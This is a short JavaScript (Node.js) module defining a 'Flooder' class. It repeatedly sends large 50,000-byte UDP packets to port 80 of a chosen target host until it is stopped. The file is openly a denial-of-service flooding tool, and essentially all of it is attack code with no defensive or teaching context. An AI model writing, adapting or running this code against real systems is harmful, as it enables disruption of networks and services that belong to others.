const dgram = require('dgram')
const events = require('events')

module.exports = class Flooder extends events.EventEmitter {
  constructor(targetHost) {
    super()
    this.targetHost = targetHost
    this.isFlooding = false
    this.client = dgram.createSocket('udp4')
  }

  start() {
    function until(fn) {
      return fn().then(result => {
        if (result) {
          return result
        }
        return until(fn)
      })
    }

    const sendOne = (ip, port) =>
      new Promise(resolve => {
        const msg = Buffer.alloc(50000)
        this.client.send(msg, port, ip, () => resolve(!this.isFlooding))
        this.emit('packet')
      })

    until(() => sendOne(this.targetHost, 80))

    this.isFlooding = true
  }

  stop() {
    this.isFlooding = false
  }
}
